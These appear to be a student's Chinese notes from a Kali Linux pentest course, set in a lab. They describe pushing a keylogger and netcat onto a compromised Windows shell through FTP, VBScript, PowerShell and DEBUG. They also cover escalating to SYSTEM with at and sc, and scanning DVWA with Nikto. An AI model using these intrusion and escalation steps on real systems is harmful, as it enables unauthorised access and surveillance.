+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514230925008.png" alt="image-20200514230925008"></p>
+<p>klogger已经运行了</p>
+<p>klogger是一个键盘监控</p>
+<p>回到xp本机，打开记事本</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200514231226712.png" alt="image-20200514231226712"></p>
+<p>因为系统里已经运行了一个klogger，就会klogger同一目录生成一个记录文件</p>
+<p>这就是通过tftp进行传输</p>
+<p>下面讲</p>
+<p><strong>通过ftp传输</strong></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200515204016193.png" alt="image-20200515204016193"></p>
+<p>在kali上安装ftp服务，演示使用的是pure-ftpd</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200515204045405.png" alt="image-20200515204045405"></p>
+<p>安装完之后需要一系列的配置才能使用</p>
+<p>配置过程写到了shell脚本里</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200515204126998.png" alt="image-20200515204126998"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200515205426046.png" alt="image-20200515205426046"></p>
+<p>21端口也确实开放了</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200515205518105.png" alt="image-20200515205518105"></p>
+<p>在浏览器里输入ftp://加本机ip</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200515205544277.png" alt="image-20200515205544277"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200515205552183.png" alt="image-20200515205552183"></p>
+<p>服务正常</p>
+<p>但也能发现ftp使用过程中是需要输入用户名和密码的</p>
+<p>所以非交互式的shell就不行了</p>
+<p>怎么变通呢？</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200515205732731.png" alt="image-20200515205732731"></p>
+<p>把命令写道文本文件里，最后ftp 运行文本里的命令</p>
+<p>呢么就用kali获得的shell</p>
+<p>把每个命令重定向，写入到文件中 </p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200515210532681.png" alt="image-20200515210532681"></p>
+<p>传一个whoami文件，再传一个klogger文件</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200515210620928.png" alt="image-20200515210620928"></p>
+<p>最后运行</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200515210641584.png" alt="image-20200515210641584"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200515210652934.png" alt="image-20200515210652934"></p>
+<p>这时候发现不行，还是权限问题</p>
+<p>那个shell脚本里创建了ftphome，</p>
+<p>所以得对ftphome里放文件</p>
+<p>再执行一下</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200515211447467.png" alt="image-20200515211447467"></p>
+<p>dir一下</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200515211509834.png" alt="image-20200515211509834"></p>
+<p>确实都下载下来了</p>
+<p>接下来是VBSCRIPT</p>
+<p>这些介绍的每一种传输方式最经常遇见的传输方式</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200515211610635.png" alt="image-20200515211610635"></p>
+<p>还是用echo把命令重定向到一个vb文件里，通过web即http或者ftp 下载木马程序</p>
+<p>所以要再kali里安装一个http服务，默认已经安装了，启动起来</p>
+<p>就是apache，用的端口80</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200515211802965.png" alt="image-20200515211802965"></p>
+<p>默认的网站服务器是放在     </p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200515211841339.png" alt="image-20200515211841339"></p>
+<p>通过浏览器看一下apache是不是成功启动</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200516095204885.png" alt="image-20200516095204885"></p>
+<p>把whoami靠到这里来，一会就用http把它传到windows上</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200515211920710.png" alt="image-20200515211920710"></p>
+<p>vb脚本</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200515212016544.png" alt="image-20200515212016544"></p>
+<p>复制所有代码粘贴到控制台就可以</p>
+<p>vbs是windows默认的脚本源，win7以后还添加了powershell</p>
+<p>命令输入完以后查看一下wget.vbs</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200516094653668.png" alt="image-20200516094653668"></p>
+<p>现在就可以执行了</p>
+<p>用cscript命令解释执行</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200516094807390.png" alt="image-20200516094807390"></p>
+<p>在获得的shell里执行</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200516095258052.png" alt="image-20200516095258052"></p>
+<p>早期版本的就可以用vbscript</p>
+<p>如果win7以上就可以用powershell</p>
+<p><strong>powershell</strong></p>
+<p>直接在主机上演示powershell把</p>
+<p>powershell脚本的后缀是ps1</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200516095623109.png" alt="image-20200516095623109"></p>
+<p>也是从http服务里下载东西</p>
+<p>怎么执行？</p>
+<p>先拷贝到d盘，再在cmd里</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200516095819146.png" alt="image-20200516095819146"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200516095832622.png" alt="image-20200516095832622"></p>
+<p>执行完就应该已经下载到了脚本里写的whoami程序</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200516100000950.png" alt="image-20200516100000950"></p>
+<p>但直接搜whoami没搜到，因为系统重命名为new-exploit了</p>
+<p>执行whoami成功了</p>
+<p>还有最后一种方式</p>
+<p><strong>DEBUG传输文件</strong></p>
+<p>debug命令很早起的系统就有（windows3.几就有），是调试汇编的工具，可以汇编反汇编</p>
+<p>但有限制就是对传输文件大小有限制</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200516100413524.png" alt="image-20200516100413524"></p>
+<p>因为大小有限制，所以要upx压缩</p>
+<p>以nc为例，要网windows上传输nc工具</p>
+<p>先在kali上准备好nc工具</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200516100830313.png" alt="image-20200516100830313"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200516101203072.png" alt="image-20200516101203072"></p>
+<p>其实nc很小没超过64k可以直接传，但这里为例演示还是压缩一下</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200516101235985.png" alt="image-20200516101235985"></p>
+<p>压缩比是49%，压缩以后还是叫nc.exe，还是能直接运行</p>
+<p>下面要把nc这个二进制程序转变为文本的形式（类似之前的shellcode）</p>
+<p>转换文本也需要工具</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200516101613574.png" alt="image-20200516101613574"></p>
+<p>执行工具</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200516101711841.png" alt="image-20200516101711841"></p>
+<p>就转换好了</p>
+<p>看一下nc.txt</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200516101734476.png" alt="image-20200516101734476"></p>
+<p>可以看到转换成了hex——一个十六进制文件</p>
+<p>把txt的内容复制粘贴到 获得的win shell里（最后两行不用复制，最后两行是要在debug页面里运行的</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200516101905573.png" alt="image-20200516101905573"></p>
+<p>需要等待它执行好久</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200516102101023.png" alt="image-20200516102101023"></p>
+<p>传过去之后就成为了一个hex文件</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200516102134660.png" alt="image-20200516102134660"></p>
+<p>有了这个文件之后，就是用debug，把这个文件作为输入，执行一下</p>
+<p>debug就会对这个文件进行汇编的过程</p>
+<p>所以会出现一个1.dll，这个dll就是nc.exe</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200516102249397.png" alt="image-20200516102249397"></p>
+<p>再下一步 copy一下就能变成nc.exe（感觉类似直接改后缀）</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200516102409698.png" alt="image-20200516102409698"></p>
+<p>再确认一下通过4444端口连kali</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200516102440756.png" alt="image-20200516102440756"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200516102503682.png" alt="image-20200516102503682"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200516102524296.png" alt="image-20200516102524296"></p>
+<p>这就是通过debug 的传输</p>
+<h3 id="kali安全第十章——提权"><a href="#kali安全第十章——提权" class="headerlink" title="kali安全第十章——提权"></a>kali安全第十章——提权</h3><p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200517220400542.png" alt="image-20200517220400542"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200517220508934.png" alt="image-20200517220508934"></p>
+<p>有的操作系统甚至在内核空间也划分了账号</p>
+<p>每次登录都会重新生成一个新的权限令牌，令牌里有随机数</p>
+<p>除了给用户的账号，还有的是给应用的账号，为了给应用开启一些系统服务，也叫服务账号</p>
+<p>注意不要将多用途的账号混用</p>
+<p>服务账号是随系统启动而启动的，即注意用户账号和服务账号的区别，即便你不登陆，服务账号可能也是运行的，开启了一些服务</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200519214510301.png" alt="image-20200519214510301">   </p>
+<p>SYSTEM才是windows下最高的账户，admin对有些注册表项是无能为力的</p>
+<p>但system一般不具有删除创建账户的权限，即可能user包含的权限并不完全包含在system权限内</p>
+<p>admin也一样，但user包含在admin里</p>
+<p>linux下比较简洁，root是最高权限，所有账号都可以被root管理 </p>
+<p>下面先讲windows下提权</p>
+<p>不同的win版本方法不太一样</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200519215041373.png" alt="image-20200519215041373"></p>
+<p>win xp 虚拟机  </p>
+<p>cmd里设置密码：</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200519215144610.png" alt="image-20200519215144610"> </p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200519215249589.png" alt="image-20200519215249589"></p>
+<p>helpassistant是做远程协助时候的账号 </p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200519215458592.png" alt="image-20200519215458592"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200519215556258.png" alt="image-20200519215556258"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200519215615410.png" alt="image-20200519215615410"></p>
+<p>注意账户属于哪个组</p>
+<p>也可以右键电脑——管理 查看属于的组</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200519215712960.png" alt="image-20200519215712960"></p>
+<p>下面从admin踢拳道system</p>
+<p>看一下进程，比如explorer就是桌面的进程</p>
+<p>分不同权限的进程<img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200519215834112.png" alt="image-20200519215834112"></p>
+<p><strong>第一种提权：使用at命令</strong></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200519215949934.png" alt="image-20200519215949934"> </p>
+<p>at是做系统调用任务的命令</p>
+<p>比如at加一个时间，就在指定时间里执行操作 </p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200519220339743.png" alt="image-20200519220339743"></p>
+<p>所以提权要</p>
+<p>at 加一个时间 加交互式执行这个命令（为了自己能看见）</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200519220353835.png" alt="image-20200519220353835"></p>
+<p>执行完这个命令后新出来的cmd就获得了system的权限</p>
+<p>如何确定呢？可以用whoami</p>
+<p>但whoami是win服务器才有的命令，</p>
+<p>可以关闭cmd到只剩刚刚出来的cmd，到进程表里一看cmd的用户名</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200519220817925.png" alt="image-20200519220817925"></p>
+<p>就知道是system了 </p>
+<p>在这个cmd启动的所有程序，就都会以system的权限进行</p>
+<p>现在能不能把桌面——即explorer进程换成system权限的？</p>
+<p>在cmd taskmgr打开任务管理器，这时候这个任务管理器也是system权限，杀掉explorer进程</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200519220955481.png" alt="image-20200519220955481"></p>
+<p>果然桌面被杀掉了</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200519221039341.png" alt="image-20200519221039341"></p>
+<p>再重启启动 </p>
+<p>（这里应该是老师win+R）</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200519221127790.png" alt="image-20200519221127790"></p>
+<p>这时候桌面又启动了</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200519221153684.png" alt="image-20200519221153684"></p>
+<p>现在执行任何程序都是system账号</p>
+<p>也可以切换回admin，就直接注销就好了 </p>
+<p>但这种方式只能在win03或者winxp上使用，win7以上at命令被取消了</p>
+<p>所以要使用sc命令</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200519221525945.png" alt="image-20200519221525945"></p>
+<p>思路是</p>
+<p>使用sc命令创建一个系统服务，sc是系统自带的命令，可以创建删除调整服务</p>
+<p>查看所有的服务可以<img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200519222252344.png" alt="image-20200519222252344"></p>
+<p>  <img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200519222347400.png" alt="image-20200519222347400"></p>
+<p>syscmd是服务名字，随便取</p>
+<p>binpath是：将会执行的命令由binpath指定 </p>
+<p>（cmd /k start就是启动一个新cmd的命令）</p>
+<p>服务由启动的账号所拥有，启动类型是交互式的 </p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200519222643097.png" alt="image-20200519222643097"></p>
+<p>启动之后就去服务列表里找</p>
+<p>老师起的名字是syscmd</p>
+<p>服务本质上是被添加了，需要手动启动</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200519222903355.png" alt="image-20200519222903355">  </p>
+<p>但这种需要能看到桌面，如果不能看到桌面，可以</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200519223034139.png" alt="image-20200519223034139"></p>
+<p>启动指定服务</p>
+<p> 就得到了system的新的cmd</p>
+<p>因此以上的思路就是服务默认都会用system来启动，</p>
+<p><strong>第二种：外置的工具软件</strong></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200519223347539.png" alt="image-20200519223347539"></p>
+<p>sysinternals是win下的一个工具包的套件</p>
+<p>很强大，win的应该都去掌握</p>
+<p>下载下来以后有一个whois程序，这个是windows server自带的，win系统没有，把他复制到windows——system32文件夹下</p>
+<p>再命令行执行</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200627173900401.png" alt="image-20200627173900401"></p>
+<p>其实这里是错误的，whoami应该直接显示当前权限</p>
+<p>老师从别处拷了一个whois.exe程序，重新放入system32文件夹才成功的</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200627174637288.png" alt="image-20200627174637288"></p>
+<p>然后用下面命令打开一个新的cmd</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200627174703999.png" alt="image-20200627174703999"></p>
+<p>再whoami发现就是system账号了</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200627174729902.png" alt="image-20200627174729902"></p>
+<p>而下载的sysinternals中</p>
+<p>有另外一个工具是可以实现提权的</p>
+<p>把这个工具复制到c盘下（也可以直接复制到system32下）</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200627174850205.png" alt="image-20200627174850205"></p>
+<p>执行</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200627174905490.png" alt="image-20200627174905490"></p>
+<p>常用参数：</p>
+<p>-i：使用交互模式</p>
+<p>-s：提升为system账号</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200627175040092.png" alt="image-20200627175040092"></p>
+<p>就获得了system权限的cmd</p>
+<p>这样就可以使用system账号进行下一步（比如很多注册表项是普通管理员账号没法修改的）</p>
+<p>（下面要讲的是其他提权的方法了，sysinternals告一段落）</p>
+<p>（提权部分的第一个视频，没看完）</p>
+<h3 id="kali安全第十三章——Web渗透"><a href="#kali安全第十三章——Web渗透" class="headerlink" title="kali安全第十三章——Web渗透"></a>kali安全第十三章——Web渗透</h3><p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200627193306678.png" alt="image-20200627193306678"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200627200236601.png" alt="image-20200627200236601"></p>
+<h4 id="web渗透——http基础"><a href="#web渗透——http基础" class="headerlink" title="web渗透——http基础"></a>web渗透——http基础</h4><p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200627201505850.png" alt="image-20200627201505850"></p>
+<p>https也不是很安全，也是能实现中间人攻击的</p>
+<p>伪装成路径上的一个路由器，拿到密文解析成明文</p>
+<p>问题就是https是公私钥加密的，不知道私钥是怎么解密呢</p>
+<p>中间人自己生成一个证书，按照客户端的请求，依据服务端可能会回应的一些字段做出相对应的伪造的证书</p>
+<p>就可以用中间人的私钥解密客户端了，再伪装成客户端再与服务端进行下面的过程</p>
+<p>所以不要过度迷信https</p>
+<p>cookie：身份认证第一次通过之后，服务器会给客户下达一个cookie，以后的每一次请求的头都会带上cookie（一般每次通信后cookie是在变的）</p>
+<p>如果不使用cookie，就应该每次请求都要验证身份（即没访问一个页面都要输入账号密码）</p>
+<p>cookie与session id基本可以视为等同的，cookie可以存放session id，也可以存放其他的东西</p>
+<p>session实际是放在服务器端的，一般发给客户，能抓到的是session id，不是session</p>
+<p>所以设计时session要定时让他失效</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200701105942242.png" alt="image-20200701105942242"></p>
+<p>一个请求一个响应叫一个cycle</p>
+<p>http头： </p>
+<p>content-length：以破解密码为例，错误的密码可能返回的提示字节长度相似，正确的密码可能返回新的页面，所以通过字节长度可以判断破解是否成功</p>
+<p>ppt中前三个是server给browser</p>
+<p>后两个是browser给server</p>
+<p>（头：值成对就是指一个头后面紧跟着值）</p>
+<p>（与referrer类似的还有host头） </p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200701111910662.png" alt="image-20200701111910662"></p>
+<p>100s很少单独出现</p>
+<p>301便是永久重定向 302 临时重定向</p>
+<p>500服务器错误 503 服务不可用 </p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200701114617447.png" alt="image-20200701114617447"></p>
+<p>尽量搭建实验环境，不攻击网站</p>
+<p>课程内容主要以dnwa这个web applicatio n为例做展示，会把dvwa这个web application里的所有漏洞展示一边</p>
+<p>也可以选择metasploitable的其他web application或者取漏洞网站练习</p>
+<h4 id="web渗透——扫描工具-Nikto"><a href="#web渗透——扫描工具-Nikto" class="headerlink" title="web渗透——扫描工具-Nikto"></a>web渗透——扫描工具-Nikto</h4><p>先启动靶机metasploitable和kali</p>
+<p>都桥街道同一个网卡， 分别ifconfig，获取到两者ip，ping一下是否畅通，再访问一下靶机地址，能否打开</p>
+<p> <img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200701115954708.png" alt="image-20200701115954708"></p>
+<p>点击dvwa</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200701120038238.png" alt="image-20200701120038238"></p>
+<p>dvwa的管理密码就在下面写着呢 </p>
+<p>admin  password</p>
+<p>进入后左边DVWA Security可以调难度，不同难度下左边的不同领域的漏洞难度不一样</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200704202734981.png" alt="image-20200704202734981"></p>
+<p>本课主要是low和medium</p>
+<p>下面开始工具的介绍</p>
+<h5 id="侦察"><a href="#侦察" class="headerlink" title="侦察"></a>侦察</h5><h6 id="Httrack"><a href="#Httrack" class="headerlink" title="Httrack"></a>Httrack</h6><p>对目标网站的克隆复制的，（这里可以回顾下PETS的渗透测试流程）</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200704203034183.png" alt="image-20200704203034183"></p>
+<p>也还有其他的这种类型的工具（win下也有类似的）</p>
+<p>使用比较简单，httrack有向导</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200704203335857.png" alt="image-20200704203335857"></p>
+<p>首先去一个项目名字，再设置path目录，就是下载下来的页面放到那里存着</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200704204100251.png" alt="image-20200704204100251"> </p>
+<p>创建一个目录</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200704204122112.png" alt="image-20200704204122112"></p>
+<p>输入目录</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200704204138991.png" alt="image-20200704204138991"></p>
+<p>再输入起始路径</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200704204234119.png" alt="image-20200704204234119"></p>
+<p>给你几个选项，是要镜像这个站点，还是一个向导，或者只是下载某些文件，或者镜像所有连接，或者只是测试所有的链接</p>
+<p>这次使用2，而且它支持代理（防止起疑），代理在网上有很多，可以去这个网站找——hidemyass（但也要提醒要小心使用，有可能造成自己的信息泄露，甚至安全公司也在网上发代理） </p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200704204548300.png" alt="image-20200704204548300"></p>
+<p>在下面也可以选不同的要求</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200704204654932.png" alt="image-20200704204654932"></p>
+<p> 有世界各地的</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200704204711772.png" alt="image-20200704204711772"></p>
+<p>在虚拟机就不用了，因为用了代理回来的时候找不到虚拟机</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200704204730924.png" alt="image-20200704204730924"></p>
+<p>提示你可以筛选一些通配符（比如.gif.zip)</p>
+<p>先不用继续回车</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200704204903437.png" alt="."></p>
+<p>这个表示可以继续添加其他条件，比如-r<number>  表示递归多少层页面</p>
+<p>也不用继续回车 </p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200704205020741.png" alt="image-20200704205020741"></p>
+<p>就开始镜像了 </p>
+<p>镜像下来的会放在dwa文件夹内<img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200704205147461.png" alt="image-20200704205147461"></p>
+<p>比如</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200704221405634.png" alt="image-20200704221405634"></p>
+<p>index这个html就是dvwa的登陆页面</p>
+<p>这部分就告一段落</p>
+<p>接下来就像之前所讲的进行信息收集了</p>
+<p>信息收集后就要看是扫描了</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200705101923017.png" alt="image-20200705101923017"></p>
+<p>web部分的扫描大部分都支持两种模式——代理截断模式、主动扫描模式</p>
+<p>代理模式</p>
+<p>推荐一本书</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200705102606767.png" alt="image-20200705102606767"></p>
+<h6 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h6><p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200705104000459.png" alt="image-20200705104000459"></p>
+<p>nikto基本上是第一个要去使用的工具（老师使用的2.1.5版本）</p>
+<p>大部分的扫描器不会对os扫描（参考这张开头讲的攻击面）</p>
+<p>网络层和系统层大都不会呗web扫描器关注（ 有些可能会对网络层比如端口进行扫描）</p>
+<p>大部分还是对web server和<strong>web application</strong>进行扫描 </p>
+<p>nikto会扫描web server的版本（ppt中的软件版本就是这个意思）</p>
+<p>扫描器可能发生误报，理想情况有资源返回200，没资源返回404，但有的web server可能不遵循RFC</p>
+<p>而错误的返回码可能导致对不存在的页面做一堆操作（比如网站把200作为没有资源的返回码）</p>
+<p>第二点就是不同的文件后缀返回的404内容可能不同，所以返回404可能不代表就一定没有资源</p>
+<p>ppt中的第三条——去除时间信息后的内容取MD5值</p>
+<p>就是为了解决第二点，因为扫描器会以大量的随机名称加上后缀去碰，那应该大部分的请求都是得不到资源的，这样对它们进行哈希，得到的特征应该就是真正确实没资源时候返回的结果</p>
+<p>以上都是准备阶段，这些做完之后才进入扫描阶段</p>
+<p>（如果这样还是无法确定什么样的结果是不存在的回应，就会去掉所有的头，单对内容进行哈希）</p>
+<p>nikto中有一个参数 -no404 使用这个参数不会做这些前期操作，会直接开始扫描（当然这样会产生误判） </p>
+<p>接下来演示常用的使用命令</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200705105342658.png" alt="image-20200705105342658"></p>
+<p>nikto直接回车就是显示各种参数（但有些参数可能不会显示出来，可以man   </p>
+<p>nikto查看）</p>
+<p>第一步建议nikto -update</p>
+<p>因为很多功能是以插件的方式存在的，插件要更新才有效</p>
+<p>nikto update可能不成功（因为墙），可以去ppt中的网址下载最新的，不update也能用</p>
+<p>接下来nikto -list-plugins 查看有哪些插件</p>
+<p>下面是扫描了</p>
+<p>基本的扫描有两种方式，一种直接接url，比如可以指定url下的某个文件</p>
+<p>第二种就是接ip地址和端口（端口可以接多个，比如同时扫80和443，就80.443)</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200705110324402.png" alt="image-20200705110324402"></p>
+<p>先扫描着</p>
+<p>还支持ssl的 也就是https的扫描</p>
+<p>如果是https也可以用这两个方式（https是443端口）</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200705110537020.png" alt="image-20200705110537020"></p>
+<p>可以看到ip、ssl证书信息、ssl加密方式 （比如百度加密方式就是RSA AES128，哈希算法就是SHA256 等等）等信息</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200705110623935.png" alt="image-20200705110623935"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200705111702040.png" alt="image-20200705111702040"></p>
+<p>看前几条扫出来了server、os、php的版本，</p>
+<p>而且发现 防止点击劫持的头、XSS保护头、内容类型选项头都没有设</p>
+<p>apache的版本是过期的</p>
+<p>下面还有很多比如<img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200705111806195.png" alt="image-20200705111806195"></p>
+<p>这条说TRACE的方法是可以使用的，可能有XST的漏洞存在</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200705111904708.png" alt="image-20200705111904708"></p>
+<p>这条是发现一个跨站脚本的漏洞</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200705214859996.png" alt="image-20200705214859996"></p>
+<p>这条是发现了一个目录索引，可能可以看到所有的目录内容</p>
+<p>也可以把漏洞输出为文件</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200705215026702.png" alt="image-20200705215026702"></p>
+<p>但每一条都有可能误报，应该每一条都手动试一试</p>
+<p>但DVWA是要登录后才能显示更多的页面，所以可能需要更多的操作后再进行一次扫描</p>
+<p>另外nikto扫描多个，可以输入文件</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200705215130549.png" alt="image-20200705215130549"></p>
+<p>文件格式</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200705221303536.png" alt="image-20200705221303536"></p>
+<p>还可以和nmap做一个结合</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200705221330852.png" alt="image-20200705221330852"></p>
+<p>-oG就是输出 后面的-代表输出结果</p>
+<p>-host后面的 - 表示之前nmap扫出来的结果</p>
+<p>扫描的时候经常会发现这样一个目录</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200705221452142.png" alt="image-20200705221452142"></p>
+<p>看到之歌可以加上一个-C all（表示工具会从自己的CGI数据库中提取一个东西？进行尝试）</p>
